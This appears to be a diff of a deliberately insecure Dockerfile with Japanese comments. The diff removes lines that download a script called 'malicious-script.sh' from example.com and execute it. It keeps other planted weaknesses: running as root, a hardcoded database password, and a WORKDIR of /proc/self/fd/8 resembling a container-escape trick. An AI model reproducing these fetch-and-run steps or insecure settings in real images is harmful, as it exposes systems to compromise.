@@ -6,10 +6,6 @@ RUN apt-get update -y && apt-get install -y \
     systemd \
     zlib1g \
     perl-base
-
-# セキュリティリスクのあるADD命令を使用して外部からファイルを取得
-ADD http://example.com/malicious-script.sh /tmp/malicious-script.sh
-
 # rootユーザーで動作（非推奨）
 USER root
 
@@ -26,4 +22,4 @@ ENV DB_PASSWORD="password123"
 WORKDIR /proc/self/fd/8
 
 # 任意のスクリプトを実行（注意：実際には危険な操作）
-RUN chmod +x /tmp/malicious-script.sh && /tmp/malicious-script.sh
+CMD ["/bin/bash"]
